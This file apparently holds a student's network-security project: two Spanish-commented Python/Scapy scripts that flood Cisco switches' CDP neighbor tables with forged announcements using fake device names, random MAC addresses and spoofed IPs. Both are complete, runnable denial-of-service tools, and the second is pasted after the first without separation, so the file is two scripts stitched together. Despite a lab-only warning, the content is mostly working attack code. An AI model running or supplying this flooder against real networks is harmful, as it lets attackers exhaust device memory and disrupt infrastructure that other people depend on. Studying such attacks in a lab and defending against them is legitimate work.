#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CDP Neighbor Flooder - Ataque de Denegación de Servicio (DoS)
=============================================================

Autor: Branyel Pérez
Materia: Seguridad de Redes - Proyecto Final

Descripción:
    Este script realiza un ataque de saturación de la tabla de vecinos CDP
    mediante el envío masivo de paquetes CDP falsificados con identificadores
    dinámicos (HackByEstifenso-XX) hacia la dirección multicast CDP.

ADVERTENCIA:
    Este script es únicamente para propósitos educativos en entornos de
    laboratorio controlados. El uso no autorizado es ilegal.

Uso:
    sudo python3 CDP_Flood.py [-i INTERFACE] [-c COUNT] [-d DELAY]
"""

import argparse
import random
import signal
import sys
import time
from typing import Optional

try:
    from scapy.all import (
        Ether,
        LLC,
        SNAP,
        Raw,
        sendp,
        get_if_hwaddr,
        conf
    )
except ImportError:
    print("[!] Error: Scapy no está instalado.")
    print("[*] Instalar con: pip install scapy")
    sys.exit(1)


# Constantes CDP
CDP_MULTICAST_MAC = "01:00:0c:cc:cc:cc"
CDP_SNAP_OUI = 0x00000c
CDP_SNAP_CODE = 0x2000
CDP_VERSION = 0x02
CDP_TTL = 180
CDP_CHECKSUM_PLACEHOLDER = 0x0000

# Identificador base para los dispositivos falsos
DEVICE_ID_PREFIX = "HackByEstifenso"


class CDPFlooder:
    """Clase principal para realizar el ataque de flooding CDP."""

    def __init__(self, interface: str = "eth0", delay: float = 0.1):
        """
        Inicializa el flooder CDP.

        Args:
            interface: Interfaz de red a utilizar
            delay: Retraso entre paquetes en segundos
        """
        self.interface = interface
        self.delay = delay
        self.packet_count = 0
        self.running = True
        
        # Configurar manejador de señales
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        # Obtener MAC de la interfaz
        try:
            self.src_mac = get_if_hwaddr(interface)
        except Exception as e:
            print(f"[!] Error obteniendo MAC de {interface}: {e}")
            sys.exit(1)
            
        print(f"[*] Interfaz: {self.interface}")
        print(f"[*] MAC origen: {self.src_mac}")
        print(f"[*] MAC destino (multicast): {CDP_MULTICAST_MAC}")

    def _signal_handler(self, signum, frame):
        """Manejador de señales para detener el ataque de forma limpia."""
        print(f"\n[!] Señal recibida. Deteniendo ataque...")
        self.running = False

    def _generate_random_mac(self) -> str:
        """Genera una dirección MAC aleatoria."""
        mac = [0x00, 0x0c, 0x29,  # VMware OUI como base
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join(f'{x:02x}' for x in mac)

    def _build_cdp_tlv(self, tlv_type: int, value: bytes) -> bytes:
        """
        Construye un TLV (Type-Length-Value) CDP.

        Args:
            tlv_type: Tipo de TLV
            value: Valor del TLV

        Returns:
            Bytes del TLV construido
        """
        length = len(value) + 4  # 2 bytes tipo + 2 bytes longitud + valor
        return (
            tlv_type.to_bytes(2, 'big') +
            length.to_bytes(2, 'big') +
            value
        )

    def _build_cdp_packet(self, device_id: str) -> Ether:
        """
        Construye un paquete CDP completo.

        Args:
            device_id: Identificador del dispositivo falso

        Returns:
            Paquete Ethernet con CDP
        """
        # Generar MAC fuente aleatoria para cada paquete
        random_src_mac = self._generate_random_mac()

        # Construir payload CDP
        cdp_payload = bytes([CDP_VERSION, CDP_TTL])  # Versión y TTL
        cdp_payload += CDP_CHECKSUM_PLACEHOLDER.to_bytes(2, 'big')  # Checksum (placeholder)

        # TLV - Device ID (Tipo 0x0001)
        cdp_payload += self._build_cdp_tlv(0x0001, device_id.encode())

        # TLV - Addresses (Tipo 0x0002) - Dirección IP aleatoria
        ip_addr = bytes([
            random.randint(10, 192),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(1, 254)
        ])
        addresses_value = bytes([0x00, 0x00, 0x00, 0x01])  # Número de direcciones
        addresses_value += bytes([0x01, 0x01, 0x0c, 0x00, 0x04])  # Tipo protocolo
        addresses_value += ip_addr
        cdp_payload += self._build_cdp_tlv(0x0002, addresses_value)

        # TLV - Port ID (Tipo 0x0003)
        port_id = f"Ethernet0/{random.randint(0, 48)}"
        cdp_payload += self._build_cdp_tlv(0x0003, port_id.encode())

        # TLV - Capabilities (Tipo 0x0004) - Router + Switch
        capabilities = bytes([0x00, 0x00, 0x00, 0x29])  # Router + Switch + IGMP
        cdp_payload += self._build_cdp_tlv(0x0004, capabilities)

        # TLV - Software Version (Tipo 0x0005)
        version = b"Linux Kali 6.0 - Security Research Lab"
        cdp_payload += self._build_cdp_tlv(0x0005, version)

        # TLV - Platform (Tipo 0x0006)
        platform = b"Linux"
        cdp_payload += self._build_cdp_tlv(0x0006, platform)

        # Construir paquete completo
        packet = (
            Ether(dst=CDP_MULTICAST_MAC, src=random_src_mac, type=len(cdp_payload) + 8) /
            LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
            SNAP(OUI=CDP_SNAP_OUI, code=CDP_SNAP_CODE) /
            Raw(load=cdp_payload)
        )

        return packet

    def flood(self, count: Optional[int] = None, verbose: bool = True):
        """
        Ejecuta el ataque de flooding CDP.

        Args:
            count: Número de paquetes a enviar (None = infinito)
            verbose: Mostrar información de progreso
        """
        print(f"\n[*] Iniciando ataque CDP Flood...")
        print(f"[*] Presione Ctrl+C para detener\n")

        iteration = 0
        while self.running:
            if count is not None and iteration >= count:
                break

            # Generar nombre de dispositivo único
            device_id = f"{DEVICE_ID_PREFIX}-{iteration:04d}"

            # Construir y enviar paquete
            packet = self._build_cdp_packet(device_id)
            
            try:
                sendp(packet, iface=self.interface, verbose=False)
                self.packet_count += 1
                
                if verbose and self.packet_count % 10 == 0:
                    print(f"[+] Paquetes enviados: {self.packet_count} | "
                          f"Último ID: {device_id}")
                          
            except Exception as e:
                print(f"[!] Error enviando paquete: {e}")

            iteration += 1
            time.sleep(self.delay)

        print(f"\n[*] Ataque finalizado")
        print(f"[*] Total de paquetes enviados: {self.packet_count}")


def check_root():
    """Verifica que el script se ejecute como root."""
    import os
    if os.geteuid() != 0:
        print("[!] Error: Este script requiere permisos de root")
        print("[*] Ejecutar con: sudo python3 CDP_Flood.py")
        sys.exit(1)


def parse_arguments():
    """Procesa los argumentos de línea de comandos."""
    parser = argparse.ArgumentParser(
        description="CDP Neighbor Flooder - Ataque DoS contra infraestructura Cisco",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
    sudo python3 CDP_Flood.py
    sudo python3 CDP_Flood.py -i eth0 -c 1000
    sudo python3 CDP_Flood.py -i eth0 -d 0.05

ADVERTENCIA: Solo usar en entornos de laboratorio autorizados.
        """
    )
    
    parser.add_argument(
        '-i', '--interface',
        default='eth0',
        help='Interfaz de red a utilizar (default: eth0)'
    )
    
    parser.add_argument(
        '-c', '--count',
        type=int,
        default=None,
        help='Número de paquetes a enviar (default: infinito)'
    )
    
    parser.add_argument(
        '-d', '--delay',
        type=float,
        default=0.1,
        help='Retraso entre paquetes en segundos (default: 0.1)'
    )
    
    parser.add_argument(
        '-q', '--quiet',
        action='store_true',
        help='Modo silencioso, sin salida de progreso'
    )

    return parser.parse_args()


def print_banner():
    """Muestra el banner del script."""
    banner = """
    ╔═══════════════════════════════════════════════════════════════╗
    ║               CDP NEIGHBOR FLOODER v1.0                       ║
    ║          Ataque DoS - Saturación de Tabla CDP                 ║
    ║                                                               ║
    ║  Autor: Branyel Pérez                                         ║
    ║  Proyecto: Seguridad de Redes                                 ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║  [!] SOLO PARA USO EDUCATIVO EN LABORATORIOS CONTROLADOS      ║
    ╚═══════════════════════════════════════════════════════════════╝
    """
    print(banner)


def main():
    """Función principal."""
    print_banner()
    check_root()
    
    args = parse_arguments()
    
    # Deshabilitar advertencias de Scapy
    conf.verb = 0
    
    # Crear instancia del flooder
    flooder = CDPFlooder(
        interface=args.interface,
        delay=args.delay
    )
    
    # Ejecutar ataque
    flooder.flood(
        count=args.count,
        verbose=not args.quiet
    )


if __name__ == "__main__":
    main()
import scapy.all as s_net
import struct as bin_tool
import random as rnd
import time

# --- CONFIG ---
TARGET_MULTICAST = "01:00:0c:cc:cc:cc"
INTERFACE_DEV = "eth0"

def get_checksum(payload):
    """Lógica de verificación de integridad de red"""
    if len(payload) % 2 != 0:
        payload += b'\x00'
    val_sum = 0
    for i in range(0, len(payload), 2):
        val_sum += (payload[i] << 8) + payload[i+1]
    
    val_sum = (val_sum >> 16) + (val_sum & 0xffff)
    val_sum += (val_sum >> 16)
    return (~val_sum) & 0xffff

def gen_tlv_block(t_type, t_val):
    """Generador de bloques de datos tipo TLV"""
    return bin_tool.pack("!HH", t_type, len(t_val) + 4) + t_val

def build_cdp_core():
    """Ensambla el payload CDP con identidad personalizada"""
    # Identidad personalizada Estifenso
    node_name = f"HackByEstifenso-{rnd.randint(10, 99)}".encode()
    v_port = b"GigabitEthernet0/1"
    cap_bits = bin_tool.pack("!I", 0x21)

    data_stream = b""
    data_stream += gen_tlv_block(0x0001, node_name)
    data_stream += gen_tlv_block(0x0003, v_port)
    data_stream += gen_tlv_block(0x0004, cap_bits)

    cdp_ver = 0x02
    cdp_ttl = rnd.randint(120, 200)
    
    # Checksum provisional
    raw_header = bin_tool.pack("!BBH", cdp_ver, cdp_ttl, 0x0000)
    final_chk = get_checksum(raw_header + data_stream)

    return bin_tool.pack("!BBH", cdp_ver, cdp_ttl, final_chk) + data_stream

# --- MAIN ---
print(f"[+] Canal de red establecido en: {INTERFACE_DEV}")
print("[>] Desplegando ráfaga de anuncios CDP...")

try:
    counter = 0
    while True:
        # Usamos los alias de scapy (s_net)
        eth_frame = (
            s_net.Ether(src=s_net.RandMAC(), dst=TARGET_MULTICAST) /
            s_net.LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
            s_net.SNAP(OUI=0x00000c, code=0x2000) /
            s_net.Raw(load=build_cdp_core())
        )
        
        s_net.sendp(eth_frame, iface=INTERFACE_DEV, verbose=False)
        counter += 1
        
        if counter % 5 == 0:
            print(f"[-] Inyecciones activas: {counter}", end="\r")
            
        time.sleep(rnd.uniform(0.01, 0.04))

except KeyboardInterrupt:
    print(f"\n[!] Operación abortada. Inyecciones totales: {counter}")